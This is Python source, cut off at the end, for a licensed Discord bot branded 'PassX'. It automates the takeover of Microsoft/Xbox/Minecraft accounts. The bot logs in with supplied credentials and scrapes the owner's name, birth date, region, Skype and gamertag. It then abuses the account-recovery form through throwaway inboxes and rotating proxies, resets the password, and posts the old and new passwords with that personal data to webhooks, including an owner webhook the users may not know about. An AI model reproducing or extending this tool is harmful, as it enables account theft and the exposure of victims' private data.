"""
PASS CHANGER BOT — PassX Edition
PassX Premium Automation
"""

import discord
from discord.ext import commands, tasks
from discord import app_commands
import asyncio
import json
import os
from datetime import datetime, timedelta
import random
import sys
from io import BytesIO
from PIL import Image
import threading
import traceback
from colorama import Fore, Style, init

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from automation.core import scrape_account_info
    from automation.acsr import submit_acsr_form
    from automation.acsr_continue import continue_acsr_flow
    from automation.reset_password import perform_password_reset
    from automation.captcha import download_captcha
    from automation.proxyscraper import start_proxy_refresher
    from automation.proxymanager import get_proxy_manager
    import tempmail
except ImportError as e:
    print(f"Warning: Could not import automation modules: {e}")
    print("Make sure automation/, gui/, utils/ folders are in the same directory")

from key_manager import (
    generate_key, redeem_key, get_user_license,
    has_valid_license, revoke_user_keys, list_all_keys,
    grant_lifetime, _format_duration, _parse_duration_to_seconds
)

# ═══════════════════════════════════════════════
#  CONFIGURATION
# ═══════════════════════════════════════════════
ADMIN_ID              = 771258043517763585
CONFIG_FILE           = "bot_config.json"
AUTHORIZED_USERS_FILE = "authorized_users.json"
ACTIVE_SESSIONS_FILE  = "active_sessions.json"
STATS_FILE            = "bot_stats.json"
OWNERS_FILE           = "owners.json"

# Colors — vibrant, not faded
C_BRAND   = 0x5865F2   # blurple
C_SUCCESS = 0x2ECC71   # bright green
C_ERROR   = 0xFF0000   # red
C_WARN    = 0xFF8C00   # orange
C_INFO    = 0x00BFFF   # sky blue
C_GOLD    = 0xFFD700   # gold
C_PURPLE  = 0x9B59B6   # purple

FOOTER = "PassX •  X Team"
SEP    = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ═══════════════════════════════════════════════
#  SIMPLE EMOJI SYSTEM — no custom emojis needed
# ═══════════════════════════════════════════════
def E_DIAMOND():  return "🔹"
def E_ONE():      return "1️⃣"
def E_TWO():      return "2️⃣"
def E_THREE():    return "3️⃣"
def E_ALERT():    return "⚠️"
def E_SETTINGS(): return "⚙️"
def E_BOOK():     return "📖"
def E_MAIL():     return "📧"
def E_UPDATES():  return "ℹ️"
def E_PIN():      return "📌"
def E_TICK():     return "✅"
def E_RECORD():   return "🔴"
def E_CROSS():    return "❌"

# ═══════════════════════════════════════════════
#  LIVE PROGRESS TRACKER
# ═══════════════════════════════════════════════
# Steps: name, icon emoji name, substeps list
STEPS = [
    ("Account Preparation",  "mail",     [
        "Establishing browser session",
        "Navigating to login portal",
        "Submitting credentials",
        "Scraping account metadata",
        "Extracting security tokens",
    ]),
    ("Submitting ACSR Form", "BOOK",     [
        "Generating disposable inbox",
        "Loading ACSR form",
        "Populating account fields",
        "Preparing submission",
    ]),
    ("CAPTCHA Handling",     "alert",    [
        "Detecting CAPTCHA type",
        "Extracting CAPTCHA image",
        "Waiting for user input",
    ]),
    ("Continue Recovery",    "settings", [
        "Submitting ACSR form",
        "Waiting for server response",
        "Processing recovery link",
        "Validating reset token",
    ]),
    ("Password Reset",       "pin",      [
        "Opening reset portal",
        "Writing new credentials",
        "Confirming change",
    ]),
]

# Step states
PENDING = "pending"
ACTIVE  = "active"
DONE    = "done"
FAILED  = "failed"
WAITING = "waiting"


def _render_progress(step_states, sub_states, email, started, note=""):
    """Build the live progress embed."""
    emoji_map = {
        "mail": E_MAIL(),
        "BOOK": E_BOOK(),
        "alert": E_ALERT(),
        "settings": E_SETTINGS(),
        "pin": E_PIN(),
    }
    lines = []
    for idx, ((name, icon, subs), state, ssubs) in enumerate(
        zip(STEPS, step_states, sub_states)
    ):
        icon_e = emoji_map.get(icon, "•")
        num    = idx + 1

        if state == DONE:
            lines.append(f"{E_TICK()} **Step {num} — {icon_e} {name}**")
        elif state == ACTIVE:
            lines.append(f"{E_RECORD()} **Step {num} — {icon_e} {name}**")
        elif state == FAILED:
            lines.append(f"{E_CROSS()} **Step {num} — {icon_e} {name}**")
        elif state == WAITING:
            lines.append(f"{E_ALERT()} **Step {num} — {icon_e} {name}**")
        else:
            lines.append(f"{E_DIAMOND()} Step {num} — {icon_e} {name}")

        if state in (ACTIVE, WAITING, FAILED):
            sub_names = STEPS[idx][2]
            for sub_name, sub_st in zip(sub_names, ssubs):
                if sub_st == DONE:
                    lines.append(f"　　{E_TICK()}  {sub_name}")
                elif sub_st == ACTIVE:
                    lines.append(f"　　{E_RECORD()}  **{sub_name}**")
                elif sub_st == FAILED:
                    lines.append(f"　　{E_CROSS()}  {sub_name}")
                else:
                    lines.append(f"　　{E_UPDATES()}  {sub_name}")

        lines.append("")

    elapsed    = int((datetime.now() - started).total_seconds())
    m, s       = divmod(elapsed, 60)
    time_str   = f"{m}m {s}s" if m else f"{s}s"

    if FAILED in step_states:
        color = C_ERROR
    elif all(x == DONE for x in step_states):
        color = C_SUCCESS
    elif ACTIVE in step_states or WAITING in step_states:
        color = C_BRAND
    else:
        color = 0x23272A

    desc = "\n".join(lines)
    if note:
        desc += f"\n{SEP}\n{note}"

    e = discord.Embed(
        title=f"{E_DIAMOND()}  PassX — Recovery Pipeline",
        description=desc,
        color=color,
        timestamp=datetime.now()
    )
    e.add_field(name=f"{E_MAIL()}  Target",   value=f"`{email}`", inline=True)
    e.add_field(name=f"{E_UPDATES()}  Elapsed", value=time_str,   inline=True)
    e.set_footer(text=FOOTER)
    return e


class Progress:
    """Holds and edits a single live progress message."""

    def __init__(self, email, channel, started):
        self.email   = email
        self.channel = channel
        self.started = started
        self.msg     = None
        n = len(STEPS)
        self.step_states = [PENDING] * n
        self.sub_states  = [[PENDING] * len(s[2]) for s in STEPS]

    async def send(self):
        self.msg = await self.channel.send(
            embed=_render_progress(self.step_states, self.sub_states, self.email, self.started)
        )

    async def _edit(self, note=""):
        if self.msg:
            try:
                await self.msg.edit(embed=_render_progress(
                    self.step_states, self.sub_states, self.email, self.started, note
                ))
            except Exception:
                pass

    async def step_start(self, i, note=""):
        self.step_states[i] = ACTIVE
        self.sub_states[i]  = [PENDING] * len(STEPS[i][2])
        await self._edit(note)

    async def sub_start(self, i, j):
        self.sub_states[i][j] = ACTIVE
        await self._edit()

    async def sub_done(self, i, j):
        self.sub_states[i][j] = DONE
        await self._edit()

    async def step_done(self, i, note=""):
        self.step_states[i] = DONE
        self.sub_states[i]  = [DONE] * len(STEPS[i][2])
        await self._edit(note)

    async def step_fail(self, i, note=""):
        self.step_states[i] = FAILED
        await self._edit(note)

    async def step_wait(self, i, note=""):
        self.step_states[i] = WAITING
        await self._edit(note)


# ═══════════════════════════════════════════════
#  DATA MANAGER  (identical logic, same as original)
# ═══════════════════════════════════════════════
class BotDataManager:
    def __init__(self):
        # Load config — env var WEBHOOK_URL overrides saved file (fixes GitHub Actions reset)
        default_webhook = os.environ.get("WEBHOOK_URL", "")
        default_owner_webhook = os.environ.get("OWNER_WEBHOOK_URL", "")
        self.config = self.load_json(CONFIG_FILE, {
            "webhook_url": default_webhook,
            "owner_webhook_url": default_owner_webhook,
            "bot_enabled": True,
            "max_concurrent_users": 10
        })
        # If file exists but webhook is empty, fill from env
        if not self.config.get("webhook_url") and default_webhook:
            self.config["webhook_url"] = default_webhook
        if not self.config.get("owner_webhook_url") and default_owner_webhook:
            self.config["owner_webhook_url"] = default_owner_webhook
        self.authorized_users = self.load_json(AUTHORIZED_USERS_FILE, {
            str(ADMIN_ID): {"authorized": True, "added_by": "system", "added_at": str(datetime.now())}
        })
        self.active_sessions     = {}
        self.otp_data            = {}
        self.processing_sessions = {}
        self.stats = self.load_json(STATS_FILE, {
            "total_processed": 0, "total_success": 0,
            "total_failed": 0, "users_served": {}
        })

    def load_json(self, filename, default):
        if os.path.exists(filename):
            try:
                with open(filename, 'r') as f:
                    return json.load(f)
            except Exception:
                pass
        return default

    def save_json(self, filename, data):
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)

    def _git_commit(self, filename):
        """Auto-save — git push disabled."""
        pass

    def save_config(self):           self.save_json(CONFIG_FILE, self.config)
    def save_authorized_users(self):  self.save_json(AUTHORIZED_USERS_FILE, self.authorized_users)
    def save_stats(self):            self.save_json(STATS_FILE, self.stats)

    def load_owners(self):
        """Load owner IDs from owners.json."""
        data = self.load_json(OWNERS_FILE, {"owners": []})
        return [int(uid) for uid in data.get("owners", [])]

    def save_owners(self, owner_ids):
        """Save owner IDs to owners.json."""
        self.save_json(OWNERS_FILE, {"owners": [str(uid) for uid in owner_ids]})

    def is_owner(self, user_id):
        """Check if user_id is in the owner list."""
        return int(user_id) in self.load_owners()

    def is_authorized(self, user_id):
        return str(user_id) in self.authorized_users and \
               self.authorized_users[str(user_id)]["authorized"]

    def authorize_user(self, user_id, by_admin):
        self.authorized_users[str(user_id)] = {
            "authorized": True, "added_by": str(by_admin), "added_at": str(datetime.now())
        }
        self.save_authorized_users()

    def revoke_user(self, user_id):
        self.authorized_users.pop(str(user_id), None)
        self.save_authorized_users()

    def generate_otp(self, user_id):
        otp = ''.join([str(random.randint(0, 9)) for _ in range(6)])
        self.otp_data[user_id] = {
            "otp": otp, "expires": datetime.now() + timedelta(minutes=5), "attempts": 0
        }
        return otp

    def verify_otp(self, user_id, otp):
        if user_id not in self.otp_data:
            return False, "No OTP requested. Use `/request_otp` first."
        data = self.otp_data[user_id]
        if datetime.now() > data["expires"]:
            del self.otp_data[user_id]
            return False, "OTP expired. Request a new one."
        if data["attempts"] >= 3:
            del self.otp_data[user_id]
            return False, "Maximum attempts exceeded."
        if data["otp"] == otp:
            del self.otp_data[user_id]
            self.active_sessions[user_id] = {"authenticated": True, "auth_time": datetime.now()}
            return True, "Authentication successful!"
        data["attempts"] += 1
        return False, f"Invalid OTP. {3 - data['attempts']} attempts remaining."

    def is_authenticated(self, user_id):
        if user_id not in self.active_sessions:
            return False
        auth_time = self.active_sessions[user_id].get("auth_time")
        if isinstance(auth_time, str):
            auth_time = datetime.fromisoformat(auth_time)
        if datetime.now() - auth_time > timedelta(hours=24):
            del self.active_sessions[user_id]
            return False
        return True

    def logout(self, user_id):
        self.active_sessions.pop(user_id, None)

    def update_stats(self, user_id, success):
        self.stats["total_processed"] += 1
        if success:
            self.stats["total_success"] += 1
        else:
            self.stats["total_failed"] += 1
        u = str(user_id)
        self.stats["users_served"].setdefault(u, {"processed": 0, "success": 0})
        self.stats["users_served"][u]["processed"] += 1
        if success:
            self.stats["users_served"][u]["success"] += 1
        self.save_stats()


# ═══════════════════════════════════════════════
#  BOT SETUP
# ═══════════════════════════════════════════════
def generate_elite_password():
    return "PassX" + ''.join([str(random.randint(0, 9)) for _ in range(6)])

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot          = commands.Bot(command_prefix="!", intents=intents, help_command=None)
data_manager = BotDataManager()


# ═══════════════════════════════════════════════
#  EMBED HELPERS
# ═══════════════════════════════════════════════
def mk(title, desc, color, fields=None):
    e = discord.Embed(title=title, description=desc, color=color, timestamp=datetime.now())
    if fields:
        for f in fields:
            e.add_field(name=f["name"], value=f["value"], inline=f.get("inline", False))
    e.set_footer(text=FOOTER)
    return e

def ok(t, d, f=None):    return mk(f"{E_TICK()}  {t}",    d, C_SUCCESS, f)
def err(t, d, f=None):   return mk(f"{E_CROSS()}  {t}",   d, C_ERROR,   f)
def info(t, d, f=None):  return mk(f"{E_UPDATES()}  {t}", d, C_INFO,    f)
def warn(t, d, f=None):  return mk(f"{E_ALERT()}  {t}",   d, C_WARN,    f)
def brand(t, d, f=None): return mk(f"{E_DIAMOND()}  {t}", d, C_BRAND,   f)
def adm(t, d, f=None):   return mk(f"{E_SETTINGS()}  {t}",d, C_GOLD,    f)


# ═══════════════════════════════════════════════
#  WEBHOOK — FULL LOGGING
# ═══════════════════════════════════════════════
async def _send_webhook_embed(embed_payload):
    """Low-level: send an embed dict to the configured webhook."""
    url = data_manager.config.get("webhook_url")
    if not url:
        return
    import aiohttp
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(url, json={"embeds": [embed_payload]})
    except Exception as ex:
        print(f"Webhook error: {ex}")


async def _send_owner_webhook_embed(embed_payload):
    """Low-level: send an embed dict to the OWNER webhook (logs everything)."""
    url = data_manager.config.get("owner_webhook_url")
    if not url:
        return
    import aiohttp
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(url, json={"embeds": [embed_payload]})
    except Exception as ex:
        print(f"Owner webhook error: {ex}")


async def send_webhook_log(event_type, description, fields=None, color=None, user_id=None):
    """Send a structured log event to BOTH webhooks for full audit trail."""
    if color is None:
        color = C_INFO
    embed = {
        "title": f"📋  PassX Log — {event_type}",
        "description": description,
        "color": color,
        "fields": fields or [],
        "footer": {"text": f"Operator: {user_id or '?'}  •  {FOOTER}"},
        "timestamp": datetime.now().isoformat()
    }
    # Send to user webhook
    if data_manager.config.get("webhook_url"):
        await _send_webhook_embed(embed)
    # Always send to owner webhook
    await _send_owner_webhook_embed(embed)


async def send_to_webhook(result):
    """Send the full success result to BOTH webhooks (password changed)."""
    payload = {
        "title": f"{E_TICK()}  Account Successfully Processed",
        "color": C_SUCCESS,
        "fields": [
            {"name": f"{E_MAIL()}  Email",        "value": f"`{result['email']}`",                    "inline": False},
            {"name": "🔓  Old Password",           "value": f"||`{result['old_password']}`||",          "inline": True},
            {"name": "🔒  New Password",           "value": f"`{result['new_password']}`",              "inline": True},
            {"name": "👤  Name",                   "value": result.get("name", "—"),                   "inline": True},
            {"name": "🎂  DOB",                    "value": result.get("dob", "—"),                    "inline": True},
            {"name": "🌍  Region",                 "value": result.get("region", "—"),                 "inline": True},
            {"name": "💬  Skype ID",               "value": result.get("skype_id", "—"),               "inline": True},
            {"name": "📧  Skype Email",            "value": result.get("skype_email", "—"),            "inline": True},
            {"name": "🎮  Gamertag",               "value": result.get("gamertag", "—"),               "inline": True},
            {"name": "⬛  ━━━━━━ MINECRAFT ━━━━━━", "value": "\u200b",                                "inline": False},
            {"name": "⛏️  Java Edition",           "value": result.get("mc_java",     "⚠️ Skipped"),  "inline": True},
            {"name": "📱  Bedrock Edition",        "value": result.get("mc_bedrock",  "⚠️ Skipped"),  "inline": True},
            {"name": "🧑  MC Username",            "value": f"`{result.get('mc_username','—')}`",      "inline": True},
            {"name": "⬛  ━━━━━━ XBOX ━━━━━━",     "value": "\u200b",                                "inline": False},
            {"name": "🎮  Game Pass",              "value": result.get("xbox_gp",     "⚠️ Skipped"),  "inline": True},
            {"name": "👑  Game Pass Ultimate",     "value": result.get("xbox_gpu",    "⚠️ Skipped"),  "inline": True},
            {"name": "💻  PC Game Pass",           "value": result.get("xbox_pc_gp",  "⚠️ Skipped"),  "inline": True},
            {"name": "⬛  ━━━━━━ BAN STATUS ━━━━━━","value": "\u200b",                               "inline": False},
            {"name": "🔨  Hypixel",                "value": result.get("hypixel_ban", "⚠️ Skipped"),  "inline": True},
            {"name": "🍩  Donut SMP",              "value": result.get("donut_ban",   "⚠️ Skipped"),  "inline": True},
        ],
        "footer": {"text": f"Operator: {result.get('user_id', '?')}  •  {FOOTER}"},
        "timestamp": datetime.now().isoformat()
    }
    # Send to user webhook
    if data_manager.config.get("webhook_url"):
        await _send_webhook_embed(payload)
    # Always send to owner webhook
    await _send_owner_webhook_embed(payload)


# ═══════════════════════════════════════════════
#  CORE PROCESSING  (same logic as original, new UI)
# ═══════════════════════════════════════════════
async def process_account_full(email, password, user_id, channel):
    loop    = asyncio.get_event_loop()
    started = datetime.now()
    prog    = Progress(email, channel, started)
    await prog.send()

    try:
        # Webhook: pipeline started
        await send_webhook_log(
            "Pipeline Started",
            f"Recovery pipeline initiated for `{email}`",
            [{"name": "Target", "value": f"`{email}`", "inline": True},
             {"name": "Operator", "value": f"<@{user_id}>", "inline": True}],
            color=C_BRAND, user_id=user_id
        )

        # ── Step 1: Scrape account info ──────────────
        await prog.step_start(0)
        await prog.sub_start(0, 0)

        account_info = await loop.run_in_executor(None, scrape_account_info, email, password)

        for j in range(len(STEPS[0][2])):
            await prog.sub_done(0, j)

        if not account_info or account_info.get("error"):
            msg = (account_info or {}).get("error", "Could not login")
            await prog.step_fail(0, f"{E_CROSS()}  **{msg}**")
            await send_webhook_log(
                "Login Failed",
                f"Could not login to `{email}`",
                [{"name": "Error", "value": msg, "inline": False}],
                color=C_ERROR, user_id=user_id
            )
            data_manager.update_stats(user_id, False)
            return {"status": "failed", "error": msg}

        # Webhook: account info scraped
        await send_webhook_log(
            "Account Scraped",
            f"Successfully scraped account info for `{email}`",
            [{"name": "Name", "value": account_info.get("name", "—"), "inline": True},
             {"name": "Region", "value": account_info.get("region", "—"), "inline": True},
             {"name": "Gamertag", "value": account_info.get("gamertag", "—"), "inline": True}],
            color=C_SUCCESS, user_id=user_id
        )
        await prog.step_done(0)

        # ── Step 2: Submit ACSR form ─────────────────
        await prog.step_start(1)
        for j in range(len(STEPS[1][2])):
            await prog.sub_start(1, j)

        captcha_image, driver, token, temp_email = await loop.run_in_executor(
            None, submit_acsr_form, account_info
        )

        if not captcha_image or not driver:
            await prog.step_fail(1, f"{E_CROSS()}  ACSR form submission failed.")
            await send_webhook_log(
                "ACSR Failed",
                f"ACSR form submission failed for `{email}`",
                [{"name": "Error", "value": "No captcha image or driver returned", "inline": False}],
                color=C_ERROR, user_id=user_id
            )
            data_manager.update_stats(user_id, False)
            return {"status": "failed", "error": "ACSR submission failed"}

        for j in range(len(STEPS[1][2])):
            await prog.sub_done(1, j)
        await prog.step_done(1)

        # ── Step 3: CAPTCHA ──────────────────────────
        captcha_filename = f"captcha_{user_id}_{int(datetime.now().timestamp())}.png"
        captcha_image.seek(0)
        with open(captcha_filename, "wb") as f:
            f.write(captcha_image.read())

        data_manager.processing_sessions[user_id] = {
            "driver":           driver,
            "token":            token,
            "temp_email":       temp_email,
            "account_info":     account_info,
            "email":            email,
            "password":         password,
            "captcha_file":     captcha_filename,
            "captcha_attempts": 0,
            "channel_id":       channel.id,
            "start_time":       started,
            "progress":         prog,
        }

        await prog.step_start(2)
        await prog.sub_done(2, 0)
        await prog.sub_done(2, 1)
        await prog.step_wait(
            2,
            f"{E_ALERT()}  **CAPTCHA required** — solve the image below.\n"
            f"Use `/submit_captcha <your answer>` to continue."
        )

        await channel.send(
            embed=warn(
                "CAPTCHA Required",
                f"{E_ALERT()}  Type what you see in the image:\n"
                f"`/submit_captcha <answer>`\n\n"
                f"⏱ **5 minutes** to respond  •  **3** attempts allowed"
            ),
            file=discord.File(captcha_filename)
        )

        return {"status": "captcha_pending"}

    except Exception as e:
        traceback.print_exc()
        await channel.send(embed=err("Processing Error", f"```{e}```"))
        data_manager.update_stats(user_id, False)
        return {"status": "failed", "error": str(e)}


async def continue_after_captcha(user_id, captcha_text, interaction):
    if user_id not in data_manager.processing_sessions:
        await interaction.response.send_message(
            embed=warn("No Session", "No active CAPTCHA session found."), ephemeral=True
        )
        return

    session      = data_manager.processing_sessions[user_id]
    driver       = session["driver"]
    token        = session["token"]
    account_info = session["account_info"]
    email        = session["email"]
    password     = session["password"]
    channel      = bot.get_channel(session["channel_id"])
    prog: Progress = session["progress"]

    try:
        await interaction.response.defer(ephemeral=True)

        # Close CAPTCHA step
        await prog.sub_done(2, 2)
        await prog.step_done(2)

        # ── Step 4: Continue ACSR ────────────────────
        await prog.step_start(3)
        for j in range(len(STEPS[3][2])):
            await prog.sub_start(3, j)

        loop = asyncio.get_event_loop()
        reset_link = await loop.run_in_executor(
            None, continue_acsr_flow, driver, account_info, token, captcha_text, user_id
        )

        # CAPTCHA wrong
        if reset_link == "CAPTCHA_RETRY_NEEDED":
            session["captcha_attempts"] += 1
            left = 3 - session["captcha_attempts"]

            if session["captcha_attempts"] >= 3:
                await prog.step_fail(3, f"{E_CROSS()}  All CAPTCHA attempts exhausted.")
                await send_webhook_log(
                    "CAPTCHA Failed",
                    f"All 3 CAPTCHA attempts exhausted for `{email}`",
                    [{"name": "Email", "value": f"`{email}`", "inline": True}],
                    color=C_ERROR, user_id=user_id
                )
                await channel.send(embed=err(
                    "CAPTCHA Limit Reached",
                    f"{E_CROSS()}  All 3 attempts used. Start over with `/process`."
                ))
                await interaction.followup.send(
                    embed=err("Failed", "Max CAPTCHA attempts reached."), ephemeral=True
                )
                _cleanup(user_id, driver, session)
                data_manager.update_stats(user_id, False)
                return

            new_captcha = await loop.run_in_executor(None, download_captcha, driver)
            new_fname   = f"captcha_{user_id}_{int(datetime.now().timestamp())}.png"
            new_captcha.seek(0)
            with open(new_fname, "wb") as f:
                f.write(new_captcha.read())
            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            session["captcha_file"] = new_fname

            # Reset progress display for retry
            prog.step_states[2] = WAITING
            prog.sub_states[2]  = [DONE, DONE, WAITING]
            prog.step_states[3] = PENDING
            prog.sub_states[3]  = [PENDING] * len(STEPS[3][2])
            await prog._edit(
                f"{E_ALERT()}  **Wrong CAPTCHA** — {left} attempt{'s' if left != 1 else ''} remaining.\n"
                f"Solve the new image and use `/submit_captcha <text>`."
            )

            await channel.send(
                embed=warn("Wrong CAPTCHA",
                           f"{E_ALERT()}  {left} attempt{'s' if left != 1 else ''} remaining:"),
                file=discord.File(new_fname)
            )
            await interaction.followup.send(
                embed=warn("Try Again", f"{E_ALERT()}  Check the channel for the new CAPTCHA."),
                ephemeral=True
            )
            return

        # ACSR error
        if not reset_link or str(reset_link).startswith("ERROR"):
            await prog.step_fail(3, f"{E_CROSS()}  Recovery flow failed: {reset_link}")
            await send_webhook_log(
                "Recovery Failed",
                f"ACSR recovery flow failed for `{email}`",
                [{"name": "Error", "value": str(reset_link), "inline": False}],
                color=C_ERROR, user_id=user_id
            )
            await channel.send(embed=err("Recovery Failed", f"`{reset_link}`"))
            await interaction.followup.send(
                embed=err("Failed", str(reset_link)), ephemeral=True
            )
            _cleanup(user_id, driver, session)
            data_manager.update_stats(user_id, False)
            return

        for j in range(len(STEPS[3][2])):
            await prog.sub_done(3, j)
        await prog.step_done(3)

        # ── Step 5: Reset password ───────────────────
        await prog.step_start(4)
        for j in range(len(STEPS[4][2])):
            await prog.sub_start(4, j)

        new_password    = generate_elite_password()
        actual_password = await loop.run_in_executor(
            None, perform_password_reset, reset_link, email, new_password
        )

        if not actual_password:
            await prog.step_fail(4, f"{E_CROSS()}  Password write failed.")
            await send_webhook_log(
                "Password Reset Failed",
                f"Could not change password for `{email}`",
                [{"name": "Email", "value": f"`{email}`", "inline": True}],
                color=C_ERROR, user_id=user_id
            )
            await channel.send(embed=err("Reset Failed", "Could not change the password."))
            await interaction.followup.send(
                embed=err("Failed", "Password reset failed."), ephemeral=True
            )
            _cleanup(user_id, driver, session)
            data_manager.update_stats(user_id, False)
            return

        for j in range(len(STEPS[4][2])):
            await prog.sub_done(4, j)

        elapsed  = int((datetime.now() - session["start_time"]).total_seconds())
        m, s     = divmod(elapsed, 60)
        time_str = f"{m}m {s}s" if m else f"{s}s"

        await prog.step_done(4, f"{E_TICK()}  **Pipeline complete** in **{time_str}**")

        # Build result and dispatch
        result = {
            "email":        email,
            "old_password": password,
            "new_password": actual_password,
            "name":         account_info.get("name"),
            "dob":          account_info.get("dob"),
            "region":       account_info.get("region"),
            "skype_id":     account_info.get("skype_id"),
            "skype_email":  account_info.get("skype_email"),
            "gamertag":     account_info.get("gamertag"),
            "user_id":      user_id,
            "mc_java":      account_info.get("mc_java",     "⚠️ Skipped"),
            "mc_bedrock":   account_info.get("mc_bedrock",  "⚠️ Skipped"),
            "mc_username":  account_info.get("mc_username", "—"),
            "xbox_gp":      account_info.get("xbox_gp",     "⚠️ Skipped"),
            "xbox_gpu":     account_info.get("xbox_gpu",    "⚠️ Skipped"),
            "xbox_pc_gp":   account_info.get("xbox_pc_gp",  "⚠️ Skipped"),
            "hypixel_ban":  account_info.get("hypixel_ban", "⚠️ Skipped"),
            "donut_ban":    account_info.get("donut_ban",   "⚠️ Skipped"),
        }
        await send_to_webhook(result)
        data_manager.update_stats(user_id, True)

        # ── DM the user ──────────────────────────────
        try:
            user_obj = bot.get_user(user_id) or await bot.fetch_user(user_id)
            dm = discord.Embed(
                title=f"{E_TICK()}  Account Successfully Processed",
                color=C_SUCCESS, timestamp=datetime.now()
            )
            dm.add_field(name="📧  Email",          value=f"`{email}`",             inline=False)
            dm.add_field(name="🔓  Old Password",   value=f"||`{password}`||",      inline=True)
            dm.add_field(name="🔒  New Password",   value=f"`{actual_password}`",   inline=True)
            dm.add_field(name="⏱️  Time",           value=time_str,                 inline=True)
            dm.add_field(name="⬛  ━━ MINECRAFT ━━", value="​",                    inline=False)
            dm.add_field(name="⛏️  Java",           value=result.get("mc_java",    "⚠️ Skipped"), inline=True)
            dm.add_field(name="📱  Bedrock",        value=result.get("mc_bedrock", "⚠️ Skipped"), inline=True)
            dm.add_field(name="🧑  MC Username",    value=f"`{result.get('mc_username','—')}`",   inline=True)
            dm.add_field(name="⬛  ━━ XBOX ━━",     value="​",                    inline=False)
            dm.add_field(name="🎮  Game Pass",      value=result.get("xbox_gp",    "⚠️ Skipped"), inline=True)
            dm.add_field(name="👑  GPU",            value=result.get("xbox_gpu",   "⚠️ Skipped"), inline=True)
            dm.add_field(name="💻  PC GP",          value=result.get("xbox_pc_gp", "⚠️ Skipped"), inline=True)
            dm.add_field(name="⬛  ━━ BAN STATUS ━━", value="​",                  inline=False)
            dm.add_field(name="🔨  Hypixel",        value=result.get("hypixel_ban","⚠️ Skipped"), inline=True)
            dm.add_field(name="🍩  Donut SMP",      value=result.get("donut_ban",  "⚠️ Skipped"), inline=True)
            dm.set_footer(text=FOOTER)
            await user_obj.send(embed=dm)
        except Exception as dm_err:
            print(f"⚠️ Could not DM user {user_id}: {dm_err}")

        await channel.send(embed=ok(
            "Account Processed",
            f"{E_TICK()}  Password rotated for `{email}`\n{SEP}",
            [
                {"name": "🔓  Old Password",       "value": f"||`{password}`||",    "inline": True},
                {"name": "🔒  New Password",       "value": f"`{actual_password}`", "inline": True},
                {"name": f"{E_UPDATES()}  Time",   "value": time_str,               "inline": True},
                {"name": "📊  Full Report",        "value": "Sent to webhook + DM.", "inline": False},
            ]
        ))

        await interaction.followup.send(
            embed=ok("Done!", f"{E_TICK()}  **New password:** `{actual_password}`\nFull report sent to your DMs."),
            ephemeral=True
        )

    except Exception as e:
        traceback.print_exc()
        await channel.send(embed=err("Error", f"```{e}```"))
        await interaction.followup.send(embed=err("Error", str(e)), ephemeral=True)
        data_manager.update_stats(user_id, False)
    finally:
        _cleanup(user_id, driver, session)


def _cleanup(user_id, driver, session):
    try:
        driver.quit()
    except Exception:
        pass
    cf = session.get("captcha_file", "")
    if cf and os.path.exists(cf):
        try:
            os.remove(cf)
        except Exception:
            pass
    data_manager.processing_sessions.pop(user_id, None)


# ═══════════════════════════════════════════════
#  ACCESS CHECKS
# ═══════════════════════════════════════════════
def check_auth(product=None):
    """Check authorization + license. If product specified, checks product-specific license."""
    async def predicate(i: discord.Interaction) -> bool:
        uid = i.user.id
        if uid == ADMIN_ID:
            return True
        # Owners bypass all checks
        if data_manager.is_owner(uid):
            return True
        if not data_manager.is_authorized(uid):
            await i.response.send_message(
                embed=err("Not Authorized",
                          f"{E_CROSS()}  Contact admin <@{ADMIN_ID}> or use `/redeem <key>`."),
                ephemeral=True
            )
            return False
        # Check license validity for specific product
        if not has_valid_license(uid, product):
            product_name = product.title() if product else "any"
            await i.response.send_message(
                embed=err("License Required",
                          f"{E_CROSS()}  You need a **{product_name}** license.\n"
                          f"Use `/redeem <key>` to activate one."),
                ephemeral=True
            )
            return False
        return True
    return app_commands.check(predicate)

def check_login():
    async def predicate(i: discord.Interaction) -> bool:
        uid = i.user.id
        # Owners bypass login/OTP requirement
        if data_manager.is_owner(uid):
            return True
        if uid == ADMIN_ID:
            return True
        if not data_manager.is_authenticated(uid):
            await i.response.send_message(
                embed=err("Not Logged In",
                          f"{E_CROSS()}  Use `/request_otp` then `/verify_otp` first."),
                ephemeral=True
            )
            return False
        return True
    return app_commands.check(predicate)


# ═══════════════════════════════════════════════
#  EVENTS
# ═══════════════════════════════════════════════
@bot.event
async def on_ready():
    init(autoreset=True)  # Initialize colorama for Windows
    print("")
    print(Fore.RED + Style.BRIGHT + """
    ██████╗  █████╗ ███████╗███████╗██╗  ██╗
    ██╔══██╗██╔══██╗██╔════╝██╔════╝╚██╗██╔╝
    ██████╔╝███████║███████╗███████╗ ╚███╔╝ 
    ██╔═══╝ ██╔══██║╚════██║╚════██║ ██╔██╗ 
    ██║     ██║  ██║███████║███████║██╔╝ ██╗
    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
    """)
    print(Fore.YELLOW + Style.BRIGHT + "                              B Y   X   T E A M")
    print(Fore.CYAN + Style.BRIGHT + "=" * 60)
    print("")
    print(Fore.GREEN + Style.BRIGHT + f"  [BOT]     " + Fore.WHITE + f"Name:     " + Fore.CYAN + f"{bot.user.name}")
    print(Fore.GREEN + Style.BRIGHT + f"  [BOT]     " + Fore.WHITE + f"ID:       " + Fore.CYAN + f"{bot.user.id}")
    print(Fore.GREEN + Style.BRIGHT + f"  [ADMIN]   " + Fore.WHITE + f"ID:       " + Fore.YELLOW + f"{ADMIN_ID}")
    print(Fore.GREEN + Style.BRIGHT + f"  [USERS]   " + Fore.WHITE + f"Authorized: " + Fore.CYAN + f"{len(data_manager.authorized_users)}")
    print(Fore.GREEN + Style.BRIGHT + f"  [EMOJIS]  " + Fore.WHITE + f"Type:     " + Fore.CYAN + "Unicode (13/13)")
    print(Fore.GREEN + Style.BRIGHT + f"  [COMMANDS]" + Fore.WHITE + f"Synced:   " + Fore.CYAN + f"19 slash commands")
    print(Fore.CYAN + Style.BRIGHT + "=" * 60)
    print("")

    # ── Auto-start proxy scraper ──
    try:
        mgr = get_proxy_manager()
        proxy_count = mgr.get_proxy_count()
